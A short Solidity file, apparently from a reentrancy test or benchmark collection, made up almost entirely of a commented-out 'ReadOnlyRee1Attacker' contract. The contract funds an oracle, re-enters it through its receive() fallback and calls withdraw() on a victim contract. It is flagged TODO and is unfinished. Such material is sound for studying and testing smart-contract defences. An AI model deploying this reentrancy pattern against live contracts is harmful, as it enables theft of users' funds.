// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../cross-contract/read-only/ReadOnly_ree1.sol";

// TODO FIXME: adapt this to new logic
// contract ReadOnlyRee1Attacker is IPRNG {
//     ReadOnly_ree1 public v;
//     ReadOnly_ree1_Oracle public o;

//     constructor(address payable _v, address _o) {
//         v = ReadOnly_ree1(_v);
//         o = ReadOnly_ree1_Oracle(_o);
//     }

//     function attack() public payable {
//         require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
//         o.work{value: msg.value}(address(this));
//     }

//     function execute() external {
//         v.withdraw();
//     }

//     receive() external payable {
//         o.work(address(this));
//     }
// }
